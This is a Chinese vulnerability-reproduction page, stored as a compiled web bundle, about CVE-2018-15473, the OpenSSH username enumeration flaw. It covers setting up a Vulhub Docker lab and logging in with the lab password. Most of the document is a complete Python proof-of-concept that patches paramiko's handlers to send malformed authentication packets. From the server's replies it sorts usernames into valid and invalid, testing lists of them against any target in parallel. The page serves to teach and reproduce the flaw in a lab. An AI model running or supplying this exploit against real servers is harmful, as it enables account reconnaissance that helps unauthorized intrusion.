import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as l,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const i={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。",-1),k=n("p",null,"参考链接：",-1),d={href:"http://openwall.com/lists/oss-security/2018/08/15/5",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/Rhynorater/CVE-2018-15473-Exploit",target:"_blank",rel:"noopener noreferrer"},v={href:"https://www.anquanke.com/post/id/157607",target:"_blank",rel:"noopener noreferrer"},b=p(`<blockquote><p>OpenSSL是密码学库，主要设计目的是加密网络数据流（应用层和传输层）。OpenSSH是使用OpenSSL实现的Remote Shell。</p></blockquote><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令，编译及启动一个运行OpenSSH 7.7p1的容器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，我们在客户端执行<code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022</code>，输入密码<code>vulhub</code>，即可登录到容器中。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),g={href:"https://github.com/Rhynorater/CVE-2018-15473-Exploit",target:"_blank",rel:"noopener noreferrer"},h=p(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241012963.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，<code>root</code>是存在的用户，<code>rootInvalid</code>是不存在的用户。</p><blockquote><p>此处环境建议为：</p><ul><li>python-3.6</li><li>paramiko-2.4.1</li></ul></blockquote><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> paramiko
<span class="token keyword">import</span> multiprocessing
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> string
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint <span class="token keyword">as</span> rand
<span class="token keyword">from</span> random <span class="token keyword">import</span> choice <span class="token keyword">as</span> choice
<span class="token comment"># store function we will overwrite to malform the packet</span>
old_parse_service_accept <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span>

<span class="token comment"># list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target</span>
<span class="token comment"># with these 3 random usernames (there is an almost 0 possibility that they can be real ones)</span>
random_username_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token comment"># populate the list</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    random_username_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>

<span class="token comment"># create custom exception</span>
<span class="token keyword">class</span> <span class="token class-name">BadUsername</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token comment"># create malicious &quot;add_boolean&quot; function to malform packet</span>
<span class="token keyword">def</span> <span class="token function">add_boolean</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token comment"># create function to call when username was invalid</span>
<span class="token keyword">def</span> <span class="token function">call_error</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> BadUsername<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># create the malicious function to overwrite MSG_SERVICE_ACCEPT handler</span>
<span class="token keyword">def</span> <span class="token function">malform_packet</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    old_add_boolean <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean
    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> add_boolean
    result  <span class="token operator">=</span> old_parse_service_accept<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
    <span class="token comment">#return old add_boolean function so start_client will work again</span>
    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> old_add_boolean
    <span class="token keyword">return</span> result

<span class="token comment"># create function to perform authentication with malformed packet and desired username</span>
<span class="token keyword">def</span> <span class="token function">checkUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># instantiate transport</span>
    transport <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        transport<span class="token punctuation">.</span>start_client<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>SSHException<span class="token punctuation">:</span>
        <span class="token comment"># server was likely flooded, retry up to 3 times</span>
        transport<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> tried <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
            tried <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">return</span> checkUsername<span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Failed to negotiate SSH transport&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        transport<span class="token punctuation">.</span>auth_publickey<span class="token punctuation">(</span>username<span class="token punctuation">,</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> BadUsername<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>AuthenticationException<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token comment">#Successful auth(?)</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&quot;There was an error. Is this the correct version of OpenSSH?&quot;</span><span class="token punctuation">)</span>

<span class="token comment"># function to test target system using the randomly generated usernames</span>
<span class="token keyword">def</span> <span class="token function">checkVulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    vulnerable <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> user <span class="token keyword">in</span> random_username_list<span class="token punctuation">:</span>
        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            vulnerable <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> vulnerable

<span class="token keyword">def</span> <span class="token function">exportJSON</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Valid&quot;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;Invalid&quot;</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">&#39;Valid&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">&#39;Valid&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token keyword">not</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">&#39;Invalid&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">&#39;Invalid&#39;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exportCSV</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
    final <span class="token operator">=</span> <span class="token string">&quot;Username, Valid\\n&quot;</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        final <span class="token operator">+=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot;, &quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;\\n&quot;</span>
    <span class="token keyword">return</span> final

<span class="token keyword">def</span> <span class="token function">exportList</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>
    final <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot; is a valid user!\\n&quot;</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot; is not a valid user!\\n&quot;</span>
    <span class="token keyword">return</span> final

<span class="token comment"># assign functions to respective handlers</span>
paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span> <span class="token operator">=</span> malform_packet
paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_USERAUTH_FAILURE<span class="token punctuation">]</span> <span class="token operator">=</span> call_error

<span class="token comment"># get rid of paramiko logging</span>
logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">&#39;paramiko.transport&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>NullHandler<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

arg_parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;hostname&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The target hostname or ip address&quot;</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--port&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The target port&quot;</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--threads&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The number of threads to be used&quot;</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--outputFile&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The output file location&quot;</span><span class="token punctuation">)</span>
arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--outputFormat&#39;</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;list&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;csv&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;list&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The output file location&quot;</span><span class="token punctuation">)</span>
group <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--username&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The single username to validate&quot;</span><span class="token punctuation">)</span>
group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--userList&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;The list of usernames (one per line) to enumerate through&quot;</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Connecting to host failed. Please check the specified host and port.&#39;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token comment"># first we run the function to check if host is vulnerable to this CVE</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> checkVulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># most probably the target host is either patched or running a version not affected by this CVE</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Target host most probably is not vulnerable or already patched, exiting...&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>username<span class="token punctuation">:</span> <span class="token comment">#single username passed in</span>
        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>args<span class="token punctuation">.</span>username<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot; is a valid user!&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot; is not a valid user!&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>userList<span class="token punctuation">:</span> <span class="token comment">#username list passed in</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>userList<span class="token punctuation">)</span>
        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] File doesn&#39;t exist or is unreadable.&quot;</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        usernames <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">,</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># map usernames to their respective threads</span>
        pool <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span>args<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>
        results <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>checkUsername<span class="token punctuation">,</span> usernames<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>outputFile<span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Cannot write to outputFile.&quot;</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">&#39;json&#39;</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Results successfully written to &quot;</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">&quot; in JSON form.&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">&#39;csv&#39;</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Results successfully written to &quot;</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">&quot; in CSV form.&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>
                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Results successfully written to &quot;</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">&quot; in List form.&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment"># no usernames passed in</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] No usernames provided to check&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 